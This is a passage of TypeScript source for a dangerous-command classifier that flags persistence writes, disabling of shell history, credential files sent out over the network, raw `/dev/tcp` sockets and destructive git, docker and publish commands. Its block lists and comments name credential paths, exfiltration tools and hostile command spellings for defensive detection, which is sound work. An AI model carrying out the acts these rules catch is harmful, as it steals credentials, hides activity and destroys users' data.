		/^\/etc\/ld\.so\.conf\.d\//.test(lower)
	);
}

/**
 * `sudoers` grants privilege rather than executing anything, which is why its
 * message does not claim the line "runs".
 */
function isSudoersPath(lower: string): boolean {
	return /^\/etc\/sudoers$/.test(lower) || /^\/etc\/sudoers\.d\//.test(lower);
}

// Long-form design notes: docs/dev/command-classifier.md
/** Writing to a file that runs at the next login, on either half of a pipeline. */
function posixStartupWrite(segment: string): DangerousCommandMatch | null {
	// The segment text, not the tokens: `tokenizeShell` does not treat `>` as
	// whitespace, so `echo x>>~/.bashrc` arrives as the single token
	// `x>>~/.bashrc` and a rule reading tokens would look for a target that is
	// not there. Measured, not assumed — the same reason `posixDiskRules` reads
	// its segment.
	const targets: string[] = [];
	for (const match of segment.matchAll(/>{1,2}\s*(\S+)/g)) {
		targets.push(match[1].replace(/^["']|["']$/g, ""));
	}

	const tokens = tokenizeShell(segment);
	const program = executableName(tokens[0] ?? "", "posix");
	if (program === "tee" || program === "tee.exe") {
		// `-a` is an append flag on the same command, so it is not a redirect and
		// has to be read from the arguments.
		for (const token of tokens.slice(1)) {
			if (!token.startsWith("-")) targets.push(token.replace(/^["']|["']$/g, ""));
		}
	}
	// Long-form design notes: docs/dev/command-classifier.md
	if (program === "cp" || program === "install" || program === "mv" || program === "ln") {
		for (let index = tokens.length - 1; index > 0; index--) {
			const token = tokens[index];
			if (token.startsWith("-")) continue;
			targets.push(token.replace(/^["']|["']$/g, ""));
			break;
		}
	}
	// Long-form design notes: docs/dev/command-classifier.md
	if (program === "rsync" || program === "scp") {
		for (let index = tokens.length - 1; index > 0; index--) {
			const token = tokens[index];
			if (token.startsWith("-")) continue;
			targets.push(token.replace(/^["']|["']$/g, ""));
			break;
		}
	}
	// `dd` names its target as the *value* of `of=` and has no positional argument at
	// all, so neither the redirect scan nor the last-argument scan above can see it.
	// The reader is shared with the disk rule, which was here first.
	if (program === "dd") {
		targets.push(...ddOutputTargets(segment));
	}
	// `curl -o FILE` and `wget -O FILE` name the destination as the *value* of a
	// switch rather than as a positional argument. All five spellings of those two
	// switches are read by {@link fetchOutputTargets}, which is shared with
	// {@link downloadedFileThenRun} rather than written out a second time — the same
	// one-reader-two-callers shape {@link ddOutputTargets} has above, and for the same
	// reason: with the parse inline here, the reasoning that produced it is a
	// near-copy of the reasoning the second caller needs.
	targets.push(...fetchOutputTargets(tokens));

	for (const target of targets) {
		// A remote destination is spelled `host:/path`, and every startup predicate
		// is anchored on the leading `/` — `^\/etc\/cron\.d\//` cannot match a string
		// that begins `root@host:`. Measured, not assumed: `rsync /tmp/p
		// root@host:/etc/cron.d/job` returned `null` until this stripped the host.
		if (!isStartupPath(pathWithinRemoteTarget(target))) continue;
		// Long-form design notes: docs/dev/command-classifier.md
		const lower = target.toLowerCase();
		return {
			kind: "Other",
			rule: isSudoersPath(lower)
				? `\`${target}\` written to, which grants privilege without asking for a password again`
				: isLoaderPath(lower)
					? `\`${target}\` written to, which the dynamic linker loads into every program on this machine`
					: isCronPath(lower)
						? `\`${target}\` written to, which the scheduler runs on its own, with no login needed`
						: isServicePath(lower)
							? `\`${target}\` written to, which the init system starts on its own, with no login needed`
							: `\`${target}\` written to, which runs on every future login or boot`,
		};
	}
	return null;
}

function historyRules(segment: string): DangerousCommandMatch | null {
	const tokens = tokenizeShell(segment);
	const program = executableName(tokens[0] ?? "", "posix");
	if (program === "set") {
		// Long-form design notes: docs/dev/command-classifier.md
		const args = tokens.slice(1);
		const at = args.findIndex((arg) => arg === "+o" || arg === "-o");
		if (at === -1 || args[at] !== "+o") return null;
		if (args[at + 1] !== "history") return null;
		return { kind: "Other", rule: "`set +o history`, which stops the shell recording what runs" };
	}
	if (program === "unset" || program === "unsetenv") {
		// `unset HISTFILE HISTFILESIZE` unsets both, and only the first is this
		// rule; the second is ordinary and is not named.
		if (tokens.slice(1).some((arg) => arg === "HISTFILE")) {
			return { kind: "Other", rule: "`unset HISTFILE`, which stops the shell recording what runs" };
		}
		return null;
	}
	return null;
}

// Long-form design notes: docs/dev/command-classifier.md
/** The same rule for the assignment spelling, where there is no program to read. */
function historyAssignmentRule(segment: string): DangerousCommandMatch | null {
	const match = /(?:^|[\s;|&])(?:export\s+)?HISTFILE=([^\s;|&]*)/.exec(segment);
	if (match === null) return null;
	const value = match[1];
	if (value !== "" && value !== "/dev/null") return null;
	return { kind: "Other", rule: "`HISTFILE=` as an assignment, which stops the shell recording what runs" };
}

// Long-form design notes: docs/dev/command-classifier.md
/** Path suffixes whose contents are somebody's credential. */
const CREDENTIAL_SUFFIXES: readonly string[] = [
	".ssh/id_rsa",
	".ssh/id_dsa",
	".ssh/id_ecdsa",
	".ssh/id_ed25519",
	".ssh/id_ecdsa_sk",
	".ssh/id_ed25519_sk",
	".aws/credentials",
	".aws/config",
	".config/gcloud/credentials.db",
	".config/gcloud/application_default_credentials.json",
	".config/gh/hosts.yml",
	".docker/config.json",
	".kube/config",
	".azure/accessTokens.json",
	".azure/msal_token_cache.json",
	".npmrc",
	".netrc",
	".pgpass",
	".git-credentials",
	".gnupg",
	".env",
	".env.local",
	".env.development",
	".env.production",
];

// Long-form design notes: docs/dev/command-classifier.md
/** Programs that can carry a file off the machine. */
const CREDENTIAL_SENDERS: ReadonlySet<string> = new Set([
	"curl",
	"scp",
	"sftp",
	"ssh",
	"rsync",
	"wget",
	"nc",
	"ncat",
	"netcat",
	"socat",
	"telnet",
	"ftp",
	"mail",
	"sendmail",
]);

// Long-form design notes: docs/dev/command-classifier.md
/** The Windows spellings of the same idea, kept apart rather than merged. */
const WINDOWS_CREDENTIAL_SENDERS: ReadonlySet<string> = new Set([
	"invoke-webrequest",
	"iwr",
	"invoke-restmethod",
	"irm",
	"start-bitstransfer",
	"certutil",
	"bitsadmin",
]);

/** Whether one token names a credential file, matched on whole trailing segments. */
function namesCredential(token: string): string | undefined {
	// The `@file` and `name=@file` spellings put something in front of the path.
	// Both were measured to send the file: `curl -d @FILE` and `curl -F key=@FILE`
	// each put the file's bytes on the wire, so the prefix is stripped rather
	// than treated as part of the name.
	const cleaned = token.replace(/^.*@/, "");
	const normalized = cleaned.replace(/\\/g, "/").replace(/^\.\//, "");
	for (const suffix of CREDENTIAL_SUFFIXES) {
		if (normalized === suffix) return suffix;
		if (normalized.endsWith(`/${suffix}`)) return suffix;
	}
	return undefined;
}

// Long-form design notes: docs/dev/command-classifier.md
/** The two curl flags whose `@` is a character rather than an instruction. */
const CURL_NON_READING_DATA_FLAGS: ReadonlySet<string> = new Set(["--data-raw", "--form-string"]);

/** The tokens in a segment that actually name a file, given the flags above. */
function credentialTokensIn(segment: string, platform: DangerousCommandPlatform): string[] {
	const tokens = tokenizeShell(segment);
	const program = executableName(tokens[0] ?? "", platform);
	if (program !== "curl") return tokens;
	const named: string[] = [];
	for (let i = 1; i < tokens.length; i++) {
		// The value is skipped as well as the flag: `--data-raw @FILE` is one
		// argument written as two tokens, and stepping over the name alone would
		// leave the path to be read as a credential reference — which is exactly
		// the shape this set exists to stop.
		if (CURL_NON_READING_DATA_FLAGS.has(tokens[i])) {
			i++;
			continue;
		}
		// This one line is also what covers `--data-raw=@FILE`, and there used to
		// be a second check naming those two flags with an `=`. The driver deleted
		// that second check and nothing went red, which is not "the rule is
		// untested" — it is that every token the second check could match begins
		// with a `-`, and this line skips all of them for a reason that has
		// nothing to do with which flag it is. Kept this way rather than deleted:
		// the two `--flag=value` rows below are pinned through it.
		if (tokens[i].startsWith("-")) continue;
		named.push(tokens[i]);
	}
	return named;
}

// Long-form design notes: docs/dev/command-classifier.md
/** A credential named on a line that also reaches the network. */
function credentialExfiltrationRules(
	segments: string[],
	platform: DangerousCommandPlatform,
): DangerousCommandMatch | null {
	// `curl`, `scp` and `ssh` are spelled the same in both, so the Windows list
	// is the union rather than a replacement — a CMD line using `curl.exe` is the
	// same act as a bash line using `curl`.
	const senders =
		platform === "windows" ? new Set([...CREDENTIAL_SENDERS, ...WINDOWS_CREDENTIAL_SENDERS]) : CREDENTIAL_SENDERS;
	let credential: string | undefined;
	let reader: string | undefined;
	for (const segment of segments) {
		for (const token of credentialTokensIn(segment, platform)) {
			const named = namesCredential(token);
			if (named === undefined) continue;
			credential = named;
			reader = segmentProgram(segment, platform) ?? tokenizeShell(segment)[0];
			break;
		}
		if (credential !== undefined) break;
	}
	if (credential === undefined) return null;

	for (const segment of segments) {
		const program = segmentProgram(segment, platform);
		if (program === undefined || !senders.has(program)) continue;
		const source = reader === undefined ? "this line" : `\`${reader}\``;
		return {
			kind: "Other",
			rule: `${source} sending \`${credential}\` to the network with \`${program}\`, which publishes a credential`,
		};
	}
	return null;
}

// Long-form design notes: docs/dev/command-classifier.md
/** A raw socket opened through bash's own `/dev/tcp`. */
function devTcpRule(segment: string): DangerousCommandMatch | null {
	for (const token of tokenizeShell(segment)) {
		if (token.includes("/dev/tcp/")) {
			return { kind: "Other", rule: "`/dev/tcp`, which opens a raw socket to a named host" };
		}
	}
	return null;
}

// Long-form design notes: docs/dev/command-classifier.md
/** Classify a whole command line, one segment at a time. */
function matchScript(script: string, depth: number, platform: DangerousCommandPlatform): DangerousCommandMatch | null {
	const segments = splitShellCommands(script);
	// A credential named on a line that also reaches the network is the same act
	// in either shell, so this one is asked on both platforms rather than being
	// kept inside the POSIX block below. `namesCredential` normalises backslashes
	// itself, and `segmentProgram` is told which platform it is reading so that
	// `curl.exe` — how a PowerShell line spells it — reaches the sender list.
	const exfiltrating = credentialExfiltrationRules(segments, platform);
	if (exfiltrating) return exfiltrating;
	// Only POSIX spells a pipe this way between two commands that are each
	// ordinary on their own. Windows reads the same characters, but there the
	// dangerous end of the pipe is already a rule of its own.
	if (platform === "posix") {
		for (const segment of segments) {
			const tcp = devTcpRule(segment);
			if (tcp) return tcp;
			const record = posixRecordDestruction(segment);
			if (record) return record;
			const startup = posixStartupWrite(segment);
			if (startup) return startup;
			// The body of `sh -c 'unset HISTFILE'` is a segment of its own to the
			// shell that runs it and not one here, so the wrapper's script is read
			// as well as the segment. Only the history rules do this: every other
			// rule in this file is reached through `matchTokens`, which already
			// unwraps, and these two live here because the assignment strip inside
			// `matchTokens` would take `HISTFILE=` off before they could read it.
			const inner = wrapperScript(tokenizeShell(segment));
			const targets = inner === undefined ? [segment] : [segment, inner];
			for (const target of targets) {
				const history = historyRules(target) ?? historyAssignmentRule(target);
				if (history) return history;
			}
		}
		const piped = fetchPipedIntoInterpreter(script);
		if (piped) return piped;
		// The same act without the pipe: no bytes move between these two commands, so
		// the walk above cannot see them. Asked on the whole script rather than per
		// segment, because the pair spans two of them.
		const downloadedThenRun = downloadedFileThenRun(script);
		if (downloadedThenRun) return downloadedThenRun;
	}
	// `;` is a CMD switch separator and a command separator on every other platform,
	// so a Windows line that means it as the first arrives here already cut in two.
	// The rejoined halves are read *alongside* the original segments and not in
	// place of them, so a PowerShell `;` is still read as the separator it is.
	const candidates =
		platform === "windows" ? [...new Set([...segments, ...rejoinedSwitchSegments(segments)])] : segments;
	for (const segment of candidates) {
		const tokens = tokenizeShell(segment);
		const match = matchTokens(tokens, depth, platform, segment);
		if (match) return match;
	}
	return null;
}

// Long-form design notes: docs/dev/command-classifier.md
/** The commands a Windows line runs once its `;` halves are put back together. */
function rejoinedSwitchSegments(segments: string[]): string[] {
	const rejoined: string[] = [];
	for (const segment of segments) {
		const previous = rejoined[rejoined.length - 1];
		if (previous !== undefined && continuesSwitchBundle(previous, segment)) {
			rejoined[rejoined.length - 1] = `${previous}/${segment}`;
			continue;
		}
		rejoined.push(segment);
	}
	return rejoined;
}

/** Does `previous` end in a `/s;-style bundle` that `next` finishes? */
function continuesSwitchBundle(previous: string, next: string): boolean {
	const left = previous.trimEnd().split(/\s+/).pop() ?? "";
	if (!left.startsWith("/") || left.length < 2) return false;
	if (
		!left
			.slice(1)
			.split("/")
			.every((piece) => /^[a-z0-9]$/i.test(piece))
	)
		return false;
	const right = next.trimStart().split(/\s+/)[0] ?? "";
	return /^[a-z]+$/i.test(right);
}

// ---------------------------------------------------------------------------
// Tools that reach outside the machine: version control, containers, clusters,
// registries and forges
// ---------------------------------------------------------------------------

// Long-form design notes: docs/dev/command-classifier.md

/** `git push` flags that overwrite what is on the other end. */
const GIT_FORCE_PUSH_FLAGS: readonly string[] = ["--force", "-f", "--force-with-lease", "--force-if-includes"];

// Long-form design notes: docs/dev/command-classifier.md
/** Whether the arguments ask for a run that prints instead of acting. */
function isDryRun(args: string[]): boolean {
	if (args.includes("--dry-run")) return true;
	return args.some((arg) => arg.startsWith("-") && !arg.startsWith("--") && arg.slice(1).includes("n"));
}

/**
 * Note what is NOT folded here: git's flags are case-sensitive, and `git branch
 * -d` refuses to delete an unmerged branch while `git branch -D` does it. A
 * lower-casing pass over the arguments would merge the two and make the safe
 * spelling the dangerous one.
 */
function gitRules(tokens: string[], platform: DangerousCommandPlatform): DangerousCommandMatch | null {
	if (executableName(tokens[0], platform) !== "git") return null;
	const [subcommand, ...args] = tokens.slice(1);
	if (subcommand === undefined) return null;

	if (subcommand === "clean") {
		// Long-form design notes: docs/dev/command-classifier.md
		if (isDryRun(args)) return null;
		if (
			!args.some(
				(arg) => arg === "--force" || (arg.startsWith("-") && !arg.startsWith("--") && arg.slice(1).includes("f")),
			)
		) {
			return null;
		}
		return { kind: "Other", rule: "`git clean` with a force flag, which deletes files with no undo" };
	}

	if (subcommand === "reset") {
		// MEASURED: `--hard` put a tracked file back to its committed contents and
		// dropped a staged new file, with no commit-ish argument needed. `--soft`,
		// `--mixed` and a bare `git reset` all left the working copy alone.
		if (!args.includes("--hard")) return null;
		return { kind: "Other", rule: "`git reset --hard`, which throws away uncommitted work" };
	}

	if (subcommand === "checkout") {
		// Long-form design notes: docs/dev/command-classifier.md
		if (args.includes("-f") || args.includes("--force")) {
			return { kind: "Other", rule: "`git checkout -f`, which discards working-copy changes" };
		}
		if (!args.includes("--")) {
			if (!args.some((arg) => arg === "." || arg === "./")) return null;
			return { kind: "Other", rule: "`git checkout .`, which discards working-copy changes" };
		}
		return { kind: "Other", rule: "`git checkout --`, which discards working-copy changes" };
	}

	if (subcommand === "switch") {
		// Long-form design notes: docs/dev/command-classifier.md
		if (args.includes("-f") || args.includes("--force")) {
			return { kind: "Other", rule: "`git switch -f`, which discards working-copy changes" };
		}
		return null;
	}

	if (subcommand === "worktree") {
		// `git worktree remove -h` on this machine: `-f, --[no-]force   force
		// removal even if worktree is dirty or locked`. A linked worktree holds a
		// whole checkout, so this is a directory tree with uncommitted work in it,
		// and `--force` is what lets it go with that work still in place.
		if (args[0] !== "remove") return null;
		if (!args.includes("-f") && !args.includes("--force")) return null;
		return {
			kind: "Other",
			rule: "`git worktree remove --force`, which deletes a checkout with uncommitted work in it",
		};
	}

	if (subcommand === "submodule") {
		// `git submodule deinit -h` on this machine gives the whole grammar as
		// `git submodule [--quiet] deinit [-f|--force] (--all| [--] <path>...)`.
		// Deinitialising a submodule removes its checkout; the force is what permits
		// it while that checkout has local changes in it.
		if (args[0] !== "deinit") return null;
		if (!args.includes("-f") && !args.includes("--force")) return null;
		return {
			kind: "Other",
			rule: "`git submodule deinit -f`, which deletes submodule checkouts with local work in them",
		};
	}

	if (subcommand === "reflog") {
		// Long-form design notes: docs/dev/command-classifier.md
		if (args[0] !== "expire") return null;
		// The value is what decides, and `--all` is not it: `--all` says which
		// reflogs to touch, and `git reflog expire --expire=90.days --all` is routine
		// housekeeping. The first version of this test took a bare `--all` as the
		// aggressive half, which flagged the housekeeping spelling. `--expire` and
		// `--expire-unreachable` both take a value, and git's own option parser reads
		// them in either the `--expire=now` or the `--expire now` form, so both are
		// read here rather than only the glued one.
		const expiresNow = args.some((arg, index) => {
			const flag = arg.toLowerCase();
			if (flag === "--expire" || flag === "--expire-unreachable") {
				return (args[index + 1] ?? "").toLowerCase() === "now";
			}
			return /^--expire(?:-unreachable)?=now$/i.test(arg);
		});
		if (!expiresNow) return null;
		return {
			kind: "Other",
			rule: "`git reflog expire --expire=now`, which empties the record of what a reset threw away",
		};
	}

	if (subcommand === "restore") {
		// `--staged` on its own moves a file out of the index and leaves the file
		// alone; adding `--worktree` is what makes it throw the file away.
		if (args.includes("--staged") && !args.includes("--worktree")) return null;
		return { kind: "Other", rule: "`git restore`, which discards working-copy changes" };
	}

	if (subcommand === "branch") {
		// MEASURED: `git branch -d doomed` on an unmerged branch exited 1 with
		// "error: the branch 'doomed' is not fully merged"; `-D` deleted it.
		if (!args.includes("-D") && !args.includes("--force")) return null;
		return { kind: "Other", rule: "`git branch -D`, which deletes a branch and its commits" };
	}

	if (subcommand === "stash") {
		// MEASURED: both emptied `git stash list`. `push`, `pop` and `list` do not.
		const verb = args[0];
		if (verb !== "drop" && verb !== "clear") return null;
		return { kind: "Other", rule: `\`git stash ${verb}\`, which throws stashed work away` };
	}

	if (subcommand === "push") {
		// Long-form design notes: docs/dev/command-classifier.md
		if (isDryRun(args)) return null;
		// Long-form design notes: docs/dev/command-classifier.md
		const forced = GIT_FORCE_PUSH_FLAGS.some((flag) => args.some((arg) => arg === flag || arg.startsWith(`${flag}=`)));
		const refspecForced = args.some((arg) => arg.startsWith("+"));
		// Long-form design notes: docs/dev/command-classifier.md
		const deletes = args.some((arg) => arg === "-d" || arg === "--delete" || arg === "--mirror");
		if (!forced && !refspecForced && !deletes) return null;
		if (deletes) {
			return { kind: "Other", rule: "`git push --delete`, which removes a branch on the other end" };
		}
		return { kind: "Other", rule: "`git push` with a force, which overwrites the other end" };
	}

	return null;
}

// Long-form design notes: docs/dev/command-classifier.md
/** Container, cluster, registry and forge tools, read off their own help output. */
function containerToolRules(tokens: string[], platform: DangerousCommandPlatform): DangerousCommandMatch | null {
	const program = executableName(tokens[0], platform);
	const lower = tokens.slice(1).map((arg) => arg.toLowerCase());

	// Long-form design notes: docs/dev/command-classifier.md
	if (program === "docker" || program === "docker-compose") {
		const [group, verb] = program === "docker-compose" ? ["compose", lower[0]] : lower;
		// `docker prune` is not a subcommand — `docker prune --help` prints the
		// whole root usage and exits 0 — so only the spelled-out forms count.
		if (verb === "prune" && ["system", "image", "container", "network", "volume"].includes(group)) {
			return { kind: "Other", rule: `\`docker ${group} prune\`, which deletes everything unused` };
		}
		// Two rules rather than one, because the flag means opposite things on the
		// two nouns. `-f` on `docker rm` kills a running container and then deletes
		// it; `-f` on `docker rmi` force-removes an image, which is not running
		// anything. The message used to be `docker ${group} -f`, which kills and
		// deletes a running one` for both — a sentence about containers attached to
		// an image deletion.
		if (group === "rm" && (lower.includes("-f") || lower.includes("--force"))) {
			return { kind: "Other", rule: "`docker rm -f`, which kills and deletes a running container" };
		}
		// Long-form design notes: docs/dev/command-classifier.md
		if (group === "rmi") {
			return {
				kind: "Other",
				rule: "`docker rmi`, which deletes an image, and a locally built one cannot be pulled back",
			};
		}
		if (group === "volume" && verb === "rm") {
			// No force flag required, which looks like an oversight beside the
			// `docker rm -f` above and is not one. `-f` on `docker volume rm` is
			// `docker rm -f`'s meaning inverted: it is what lets the removal go ahead
			// on a volume that is still in use, so a plain `docker volume rm`
			// deletes the data of any volume nothing else is holding. The flag is
			// the risk when it is absent, not when it is present.
			return { kind: "Other", rule: "`docker volume rm`, which deletes the data on a volume" };
		}
		if (group === "compose") {
			// `down` alone stops containers and keeps the volumes; `-v` is what
			// takes the database with it.
			if (verb !== "down") return null;
			if (lower.includes("-v") || lower.includes("--volumes")) {
				return { kind: "Other", rule: "`docker compose down -v`, which deletes the volumes' data" };
			}
			// Long-form design notes: docs/dev/command-classifier.md
			const rmi = lower.findIndex((arg) => arg === "--rmi" || arg.startsWith("--rmi="));
			if (rmi !== -1) {
				const value = lower[rmi].includes("=") ? lower[rmi].split("=")[1] : lower[rmi + 1];
				if (value === "all") {
					return { kind: "Other", rule: "`docker compose down --rmi all`, which deletes the service's images" };
				}
			}
			return null;
		}
		return null;
	}

	if (program === "kubectl") {
		const [verb, ...rest] = lower;
		if (verb === "drain") {
			return { kind: "Other", rule: "`kubectl drain`, which evicts everything running on a node" };
		}
		if (verb !== "delete") return null;
		if (rest.includes("namespace")) {
			return { kind: "Other", rule: "`kubectl delete namespace`, which takes a namespace and its contents" };
		}
		// Long-form design notes: docs/dev/command-classifier.md
		const sweeping =
			["--all", "--all-namespaces"].some((flag) => rest.includes(flag)) || tokens.slice(1).includes("-A");
		if (!sweeping) return null;
		return { kind: "Other", rule: "`kubectl delete` over a whole set rather than one object" };
	}

	if (program === "npm" || program === "pnpm" || program === "yarn") {
		// `yarn publish` and `yarn npm publish` both exist; the second is how the
		// modern yarn spells it, and the indirection is why this reads `lower[1]`
		// for one program and `lower[0]` for the others rather than unifying them.
		// None of the three is installed on this machine, so unlike the git rows
		// above these spellings were read from each tool's documented usage rather
		// than measured by running it.
		const verb = program === "yarn" && lower[0] === "npm" ? lower[1] : lower[0];
		// `npm publish --dry-run` and `npm unpublish --dry-run` both exist and
		// both print instead of sending, so the dry run is the exemption.
		if (verb === "publish" || verb === "unpublish") {
			if (isDryRun(lower)) return null;
			return { kind: "Other", rule: `\`${program} ${verb}\`, which changes a published package` };
		}
		if (verb === "deprecate") {
			return { kind: "Other", rule: `\`${program} deprecate\`, which changes what every install gets` };
		}
		if (verb === "dist-tag" && lower[1] === "rm") {
			return { kind: "Other", rule: `\`${program} dist-tag rm\`, which moves a published version out of reach` };
		}
		return null;
	}

	// Long-form design notes: docs/dev/command-classifier.md
	if (program === "cargo") {
		if (lower[0] !== "publish" && lower[0] !== "yank") return null;
		if (lower[0] === "publish" && isDryRun(lower)) return null;
		return { kind: "Other", rule: `\`cargo ${lower[0]}\`, which changes what a published crate gives every install` };
	}

	if (program === "gem") {
		if (lower[0] !== "push") return null;
		return { kind: "Other", rule: "`gem push`, which publishes a gem every install can then fetch" };
	}

	if (program === "twine") {
		if (lower[0] !== "upload") return null;
		return { kind: "Other", rule: "`twine upload`, which publishes a package every install can then fetch" };
	}

	if (program === "gh") {
		// `gh repo archive` is deliberately not here: a repository can be
		// unarchived, so it is a different act from deleting one. `gh run delete`
		// is not here either — it removes a CI log, which is a build record and
		// not the user's own work.
		if (lower[0] === "repo" && lower[1] === "delete") {
			return { kind: "Other", rule: "`gh repo delete`, which deletes a repository" };
		}
		if (lower[0] === "secret" && lower[1] === "delete") {
			return { kind: "Other", rule: "`gh secret delete`, which removes a credential from a repository" };
		}
		return null;
	}

	return null;
}

function developmentToolRules(tokens: string[], platform: DangerousCommandPlatform): DangerousCommandMatch | null {
	return gitRules(tokens, platform) ?? containerToolRules(tokens, platform) ?? syncToolRules(tokens);
}

// Long-form design notes: docs/dev/command-classifier.md
/** `rsync`'s deletion flag, which decides whether the command is a copy or a removal. */
function syncToolRules(tokens: string[]): DangerousCommandMatch | null {
	const program = executableName(tokens[0], "posix");
	if (program !== "rsync") return null;

	const args = tokens.slice(1);
	if (!args.some((arg) => arg.startsWith("--delete") || arg === "--del")) return null;
	if (isDryRun(args)) return null;

	return {
		kind: "Other",
		rule: "`rsync --delete`, which deletes the files at the destination that are not at the source",
	};
}

/**
 * Classify a command line, or `null` when no rule matched.
 *
 * `null` means "nothing here was recognized as dangerous" — it is not a claim
 * that the command is safe, and the engine never widens access on it.
 */
export function classifyDangerousCommand(
	command: string,
	platform: DangerousCommandPlatform = process.platform === "win32" ? "windows" : "posix",
): DangerousCommandMatch | null {
	return matchScript(command, 0, platform);
}
